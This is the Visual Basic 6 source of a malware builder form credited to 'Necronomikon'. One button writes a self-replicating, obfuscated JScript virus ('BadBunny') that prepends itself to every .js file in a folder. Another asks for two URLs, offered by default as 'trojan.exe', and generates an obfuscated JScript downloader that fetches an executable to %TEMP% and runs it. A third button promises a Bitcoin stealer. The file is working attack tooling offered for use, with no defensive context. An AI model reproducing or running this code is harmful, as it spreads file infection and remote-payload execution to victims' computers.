VERSION 5.00
Begin VB.Form Form3 
   BackColor       =   &H00000000&
   Caption         =   "Extras"
   ClientHeight    =   1185
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   2595
   LinkTopic       =   "Form3"
   ScaleHeight     =   1185
   ScaleWidth      =   2595
   StartUpPosition =   3  'Windows-Standard
   Begin VB.OptionButton Option3 
      BackColor       =   &H00000000&
      Caption         =   "Create Bitcoinstealer"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   840
      Width           =   2175
   End
   Begin VB.OptionButton Option2 
      BackColor       =   &H00000000&
      Caption         =   "Create JS-Downloader"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   480
      Width           =   2415
   End
   Begin VB.OptionButton Option1 
      BackColor       =   &H00000000&
      Caption         =   "Create Badbunny JS-Infector"
      ForeColor       =   &H00FFFFFF&
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   2655
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Option1_Click()

Open "badbunny.js" For Output As #2
Print #2, "// BadBunny by Necronomikon"
Print #2, "var FSO=WScript.CreateObject(unescape(""%53"")+unescape(""%63"")+unescape(""%72"")+unescape(""%69"")+unescape(""%50"")+unescape(""%74"")+unescape(""%69"")+""n""+unescape(""%67"")+"".""+unescape(""%46"")+unescape(""%69"")+""l""+unescape(""%65"")+unescape(""%53"")+unescape(""%79"")+unescape(""%73"")+unescape(""%74"")+unescape(""%65"")+""mO""+unescape(""%62"")+""j""+unescape(""%65"")+unescape(""%63"")+unescape(""%74""))"
Print #2, "var me=FSO.OpenTextFile(WScript.ScriptFullName,1)"
Print #2, "var OurCode=me.Read(1759)"
Print #2, "me.Close()"
Print #2, "nl=String.fromCharCode(13,10); code=''; count=0; fcode=''"
Print #2, "file=FSO.OpenTextFile(WScript.ScriptFullName).ReadAll()"
Print #2, "for (i=0; i<file.length; i++) { check=0; if (file.charAt(i)==String.fromCharCode(123) && Math.round(Math.random()*3)==1) { foundit(); check=1 } if (!check) { code+=file.charAt(i) } }"
Print #2, "FSO.OpenTextFile(WScript.ScriptFullName,2).Write(code+fcode)"
Print #2, "var jsphile=new Enumerator(FSO.GetFolder(""."").Files)"
Print #2, "for(;!jsphile.atEnd();jsphile.moveNext())"
Print #2, "{"
Print #2, "if(FSO.GetExtensionName(jsphile.item()).toUpperCase()==""JS"")"
Print #2, "{"
Print #2, "var filez=FSO.OpenTextFile(jsphile.item().path,1)"
Print #2, "var Marker=filez.Read(11)"
Print #2, "var allinone=Marker+filez.ReadAll()"
Print #2, "filez.Close()"
Print #2, "if(Marker!=""// BadBunny"")"
Print #2, "{"
Print #2, "var filez=FSO.OpenTextFile(jsphile.item().path,2)"
Print #2, "filez.Write(OurCode+allinone)"
Print #2, "filez.Close()"
Print #2, "}"
Print #2, "}"
Print #2, "}"
Print #2, "function foundit()"
Print #2, "{"
Print #2, "fcodea=''; count=0; randon='';"
Print #2, "for (j=i; j<file.length; j++) { if (file.charAt(j)==String.fromCharCode(123)) { count++; } if (file.charAt(j)==String.fromCharCode(125)) { count--; } if (!count) { fcodea=file.substring(i+1,j); j=file.length; } }"
Print #2, "for (j=0; j<Math.round(Math.random()*5)+4; j++) { randon+=String.fromCharCode(Math.round(Math.random()*25)+97) }"
Print #2, "fcode+=nl+nl+'function '+randon+'()'+nl+String.fromCharCode(123)+nl+fcodea+nl+String.fromCharCode(125)"
Print #2, "code+=String.fromCharCode(123)+' '+randon+'() '"
Print #2, "i+=fcodea.length;"
Print #2, "}"
Print #2, "//->"
Close #2
MsgBox "JS-Infector created...", vbInformation, "Necronomikon says: "
End Sub

Private Sub Option2_Click()
Do
    URL = InputBox("Enter URL where your file can be downloaded", "Download your file", "http://domainname.com/trojan.exe")
    Loop While URL = ""
Do
    URLb = InputBox("Enter a 2nd URL where your file can be downloaded", "Download your file", "http://seconddomain.com/trojan.exe")
    Loop While URLb = ""

Randomize
chr1 = (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + Chr(Int((57 - 48 + 1) * Rnd + 48))
chr2 = (Chr(66 + Int(Rnd * 23))) + (Chr(123 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + Chr(Int((57 - 48 + 1) * Rnd + 48))
chr3 = (Chr(67 + Int(Rnd * 24))) + (Chr(124 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + Chr(Int((57 - 48 + 1) * Rnd + 48))
enc1 = (Chr(68 + Int(Rnd * 25))) + (Chr(125 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + Chr(Int((57 - 48 + 1) * Rnd + 48))
enc2 = (Chr(69 + Int(Rnd * 26))) + (Chr(126 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + Chr(Int((57 - 48 + 1) * Rnd + 48))
enc3 = (Chr(70 + Int(Rnd * 27))) + (Chr(127 - Int(Rnd * 22))) + (Chr(65 + Int(Rnd * 22))) + (Chr(122 - Int(Rnd * 22))) + Chr(Int((57 - 48 + 1) * Rnd + 48))


Open "downloader.js" For Output As #2
Print #2, "// JS.Downloader (c)by Necronomikon"
Print #2, "var decode = function (packedText) {"
Print #2, "var cipher = ""dQx401WFgF2906"";"
Print #2, "var Base64 = {"
Print #2, "_keyStr: ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="","
Print #2, "decode: function (input) {"
Print #2, "var output = """";"
Print #2, "var " & chr1 & "" & ";"
Print #2, "var " & chr2 & "" & ";"
Print #2, "var " & chr3 & "" & ";"
Print #2, "var " & enc1 & "" & ";"
Print #2, "var " & enc2 & "" & ";"
Print #2, "var " & enc3 & "" & ";"
'Print #2, "var enc1, enc2, enc3, enc4;"
Print #2, "var i = 0;"
Print #2, "input = input.replace(/[^A-Za-z0-9\+\/\=]/g, """");"
Print #2, "while (i < input.length) {"

Print #2, "" & enc1 & " = this._keyStr.indexOf(input.charAt(i++));"
Print #2, "" & enc2 & " = this._keyStr.indexOf(input.charAt(i++));"
Print #2, "" & enc3 & " = this._keyStr.indexOf(input.charAt(i++));"
Print #2, "enc4 = this._keyStr.indexOf(input.charAt(i++));"
Print #2, "" & chr1 & " = (" & enc1 & " << 2) | (" & enc2 & " >> 4);"
Print #2, "" & chr2 & " = ((" & enc2 & " & 15) << 4) | (" & enc3 & " >> 2);"
Print #2, "" & chr3 & " = ((" & enc3 & " & 3) << 6) | enc4;"
Print #2, "output = output + String.fromCharCode(" & chr1 & ");"
Print #2, "if (" & enc3 & " != 64) {"
Print #2, "output = output + String.fromCharCode(" & chr2 & ");"
Print #2, "}"
Print #2, "if (enc4 != 64) {"
Print #2, "output = output + String.fromCharCode(" & chr3 & ");"
Print #2, "}"

Print #2, "}"

Print #2, "output = Base64._utf8_decode(output);"

Print #2, "return output;"

Print #2, "},"
Print #2, "_utf8_decode: function (utftext) {"
            Print #2, "var string = """";"
            Print #2, "var i = 0;"
            Print #2, "var c = c1 = c2 = 0;"

            Print #2, "while (i < utftext.length) {"

                Print #2, "c = utftext.charCodeAt(i);"

                Print #2, "if (c < 128) {"
                    Print #2, "string += String.fromCharCode(c);"
                    Print #2, "i++;"
                Print #2, "}"
                Print #2, "else if ((c > 191) && (c < 224)) {"
                    Print #2, "c2 = utftext.charCodeAt(i + 1);"
                    Print #2, "string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));"
                    Print #2, "i += 2;"
                Print #2, "}"
                Print #2, "else {"
                    Print #2, "c2 = utftext.charCodeAt(i + 1);"
                    Print #2, "c3 = utftext.charCodeAt(i + 2);"
                    Print #2, "string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));"
                    Print #2, "i += 3;"
                Print #2, "}"

            Print #2, "}"
            Print #2, "return string;"
        Print #2, "}"
    Print #2, "};"

    Print #2, "var text = Base64.decode(packedText);"

    Print #2, "var cipherLength = cipher.length;"
    Print #2, "var result = """";"
    Print #2, "for (var i = 0; i < text.length; i++) {"
        Print #2, "result += String.fromCharCode(text.charCodeAt(i) ^ cipher.charCodeAt(i % cipherLength));"
    Print #2, "}"
    Print #2, "return result;"
Print #2, "};"
Print #2, "(function() {"
    Print #2, "var statusOk = 200;"
    Print #2, "var get = ""GET"";"
    Print #2, "var exec = ""Exec"";"
    Print #2, "var wscriptShell = ""WScript.Shell"";"
    Print #2, "var xmlHttp = ""MSXML2.XMLHTTP"";"
    Print #2, "var adodb = ""ADODB"";"
    Print #2, "var stream = ""Stream"";"
    Print #2, "var temp = ""%TEMP%\\"";"
    Print #2, "var exe = "".exe"";"
    Print #2, "var minSize = 2e5;"
    Print #2, "var urls = [ """ & URL & """, """ & URLb & """ ];"
    Print #2, "var filename = " & chr1 & ";"
    Print #2, "var shellObject = WScript.CreateObject(wscriptShell);"
    Print #2, "var httpObject = WScript.CreateObject(xmlHttp);"
    Print #2, "var streamObject = WScript.CreateObject(adodb + ""."" + stream);"
    Print #2, "var tempDir = shellObject.ExpandEnvironmentStrings(temp);"
    Print #2, "var exePath = tempDir + filename + exe;"
    Print #2, "var success = false;"
    Print #2, "for (var i = 0; i < urls.length; i++) {"
        Print #2, "try {"
            Print #2, "var url = urls[i];"
            Print #2, "httpObject.open(get, url, false);"
            Print #2, "httpObject.send();"
            Print #2, "if (httpObject.status == statusOk) {"
                Print #2, "try {"
                    Print #2, "streamObject.open();"
                    Print #2, "streamObject.type = 1;"
                    Print #2, "streamObject.write(httpObject.responseBody);"
                    Print #2, "if (streamObject.size > minSize) {"
                        Print #2, "i = urls.length;"
                        Print #2, "streamObject.position = 0;"
                        Print #2, "streamObject.saveToFile(exePath, 2);"
                        Print #2, "success = true;"
                    Print #2, "}"
                Print #2, "} finally {"
                    Print #2, "streamObject.close();"
                Print #2, "}"
            Print #2, "}"
        Print #2, "} catch (ignored) {}"
    Print #2, "}"
    Print #2, "if (success) {"
        Print #2, "shellObject[exec](tempDir + Math.pow(2, 19));"
    Print #2, "}"
Print #2, "})();"
Close #2
MsgBox "Downloader created...", vbInformation, "Necronomikon says: "
End Sub

Private Sub Option3_Click()
MsgBox "maybe in the next release...", vbInformation, "Necronomikon says: "
End Sub
